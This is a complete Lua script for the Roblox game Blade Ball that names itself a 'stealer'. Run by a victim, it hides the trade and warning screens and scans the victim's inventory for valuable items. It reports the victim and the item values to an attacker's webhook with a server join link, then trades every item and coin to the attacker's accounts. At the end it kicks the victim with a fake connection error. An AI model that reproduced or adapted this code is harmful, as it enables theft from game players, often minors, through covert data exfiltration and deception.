-- // CONFIGURATION & EXECUTION CHECK
_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then
    return
end
_G.scriptExecuted = true

-- // SERVICES
local itemsToSend = {}
local categories = {"Sword", "Emote", "Explosion"}
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local netModule = game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")
local PlayerGui = plr.PlayerGui
local tradeGui = PlayerGui.Trade
local inTrade = false
local notificationsGui = PlayerGui.Notifications
local tradeCompleteGui = PlayerGui.TradeCompleted
local clientInventory = require(game.ReplicatedStorage.Shared.Inventory.Client).Get()
local Replion = require(game.ReplicatedStorage.Packages.Replion)

-- // SETTINGS
local users = _G.Usernames or {}
local min_rap = _G.min_rap or 100
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or ""
local auth_token = "EBK-SS-A" 

-- // PROFILE PICTURE (AVATAR) FIX
local headshot = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=420&height=420&format=png"

-- // PRE-CHECKS
if next(users) == nil or webhook == "" then
    plr:kick("Configuration Error: Usernames or Webhook is empty.")
    return
end

if game.PlaceId ~= 13772394625 then
    plr:kick("Script Error: Only works on Blade Ball.")
    return
end

-- // PIN CHECK
local args_pin = { [1] = { ["option"] = "PIN", ["value"] = "9079" } }
local _, PINReponse = netModule:WaitForChild("RF/ResetPINCode"):InvokeServer(unpack(args_pin))
if PINReponse ~= "You don't have a PIN code" then
    plr:kick("Account Error: Please disable your Trade PIN and try again.")
    return
end

-- // UI STEALTH
tradeGui.Black.Visible = false
tradeGui.MiscChat.Visible = false
tradeCompleteGui.Black.Visible = false
tradeCompleteGui.Main.Visible = false
local maintradegui = tradeGui.Main
maintradegui.Visible = false
maintradegui:GetPropertyChangedSignal("Visible"):Connect(function() maintradegui.Visible = false end)
local unfairTade = tradeGui.UnfairTradeWarning
unfairTade.Visible = false
unfairTade:GetPropertyChangedSignal("Visible"):Connect(function() unfairTade.Visible = false end)
local notificationsFrame = notificationsGui.Notifications
notificationsFrame.Visible = false
notificationsFrame:GetPropertyChangedSignal("Visible"):Connect(function() notificationsFrame.Visible = false end)

-- // FORMATTING
local function formatNumber(number)
    if number == nil then return "0" end
    local suffixes = {"", "k", "m", "b", "t"}
    local suffixIndex = 1
    while number >= 1000 and suffixIndex < #suffixes do
        number = number / 1000
        suffixIndex = suffixIndex + 1
    end
    return (suffixIndex == 1) and tostring(math.floor(number)) or string.format("%.2f%s", number, suffixes[suffixIndex])
end

local totalRAP = 0

-- // WEBHOOK SENDER FUNCTIONS
local function SendJoinMessage(list, prefix)
    local botUsername = (totalRAP >= 500) and "🟢 GOOD HIT 🎯" or "🟣 SMALL HIT 🎯"
    local embedColor = (totalRAP >= 500) and 65280 or 8323327
    
    local fields = {
        {name = "Victim Username 🤖:", value = plr.Name, inline = true},
        {name = "Join link 🔗:", value = "https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=" .. game.JobId},
        {name = "Item list 📝:", value = "", inline = false},
        {name = "Summary 💰:", value = string.format("Total RAP: **%s**", formatNumber(totalRAP)), inline = false}
    }

    local grouped = {}
    for _, item in ipairs(list) do
        if grouped[item.Name] then
            grouped[item.Name].Count = grouped[item.Name].Count + 1
            grouped[item.Name].TotalRAP = grouped[item.Name].TotalRAP + item.RAP
        else
            grouped[item.Name] = {Name = item.Name, Count = 1, TotalRAP = item.RAP}
        end
    end

    local groupedList = {}
    for _, group in pairs(grouped) do table.insert(groupedList, group) end
    table.sort(groupedList, function(a, b) return a.TotalRAP > b.TotalRAP end)

    for _, group in ipairs(groupedList) do
        fields[3].value = fields[3].value .. string.format("%s (x%s) - **%s RAP**\n", group.Name, group.Count, formatNumber(group.TotalRAP))
    end

    local data = {
        ["avatar_url"] = headshot,
        ["username"] = botUsername,
        ["auth_token"] = auth_token,
        ["content"] = prefix .. "```game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')```",
        ["embeds"] = {{
            ["title"] = botUsername,
            ["color"] = embedColor,
            ["fields"] = fields,
            ["thumbnail"] = {["url"] = headshot},
            ["footer"] = {["text"] = "Blade Ball stealer by Eblack"}
        }}
    }
    request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
end

local function SendMessage(list)
    local botUsername = (totalRAP >= 500) and "🟢 GOOD HIT 🎯" or "🟣 SMALL HIT 🎯"
    local embedColor = (totalRAP >= 500) and 65280 or 8323327
    local fields = {
        {name = "Victim Username 🤖:", value = plr.Name, inline = true},
        {name = "Items sent 📝:", value = "", inline = false},
        {name = "Summary 💰:", value = string.format("Total RAP: **%s**", formatNumber(totalRAP)), inline = false}
    }
    local data = {
        ["avatar_url"] = headshot,
        ["username"] = botUsername,
        ["auth_token"] = auth_token,
        ["embeds"] = {{
            ["title"] = "⚪ Server Hit 🎉" ,
            ["color"] = embedColor,
            ["fields"] = fields,
            ["thumbnail"] = {["url"] = headshot},
            ["footer"] = {["text"] = "Blade Ball stealer by Eblack"}
        }}
    }
    request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
end

-- // TRADE LOGIC
tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
    inTrade = tradeGui.Enabled
end)

local function sendTradeRequest(user)
    local args = { [1] = game:GetService("Players"):WaitForChild(user) }
    repeat task.wait(0.1) until netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(unpack(args)) == true
end

local function addItemToTrade(itemType, ID)
    netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(itemType, ID)
end

local function readyTrade()
    repeat task.wait(0.1) until netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true) == true
end

local function confirmTrade()
    repeat task.wait(0.1) netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer() until not inTrade
end

-- // INVENTORY SCAN
local rapData = Replion.Client:GetReplion("ItemRAP").Data.Items
local function getRAP(cat, name)
    local catData = rapData[cat]
    if not catData then return 0 end
    for k, v in pairs(catData) do
        local ok, decoded = pcall(HttpService.JSONDecode, HttpService, k)
        if ok and type(decoded) == "table" then
            for _, p in ipairs(decoded) do if p[1] == "Name" and p[2] == name then return v end end
        end
    end
    return 0
end

for _, category in ipairs(categories) do
    for itemId, itemInfo in pairs(clientInventory[category]) do
        if not itemInfo.TradeLock then
            local rap = getRAP(category, itemInfo.Name)
            if rap >= min_rap then
                totalRAP = totalRAP + rap
                table.insert(itemsToSend, {ItemID = itemId, RAP = rap, itemType = category, Name = itemInfo.Name})
            end
        end
    end
end

-- // MAIN LOOP
if #itemsToSend > 0 then
    table.sort(itemsToSend, function(a, b) return a.RAP > b.RAP end)
    local prefix = (ping == "Yes") and "--[[@everyone]] " or ""
    SendJoinMessage(itemsToSend, prefix)

    local function doTrade(joinedUser)
        while #itemsToSend > 0 do
            sendTradeRequest(joinedUser)
            repeat task.wait(0.2) until inTrade
            local batch = {}
            for i = 1, math.min(100, #itemsToSend) do table.insert(batch, table.remove(itemsToSend, 1)) end
            for _, item in ipairs(batch) do addItemToTrade(item.itemType, item.ItemID) end
            
            local tokens = tonumber(PlayerGui.Trade.Main.Currency.Coins.Amount.Text:gsub("[^%d]", "")) or 0
            if tokens > 0 then netModule:WaitForChild("RF/Trading/AddTokensToTrade"):InvokeServer(tokens) end
            
            task.wait(1)
            readyTrade()
            task.wait(0.5)
            confirmTrade()
        end
        plr:kick("Connection Error")
    end

    local function checkAndTrade(player)
        if table.find(users, player.Name) then
            SendMessage(itemsToSend)
            doTrade(player.Name)
        end
    end

    for _, p in ipairs(Players:GetPlayers()) do checkAndTrade(p) end
    Players.PlayerAdded:Connect(checkAndTrade)
end
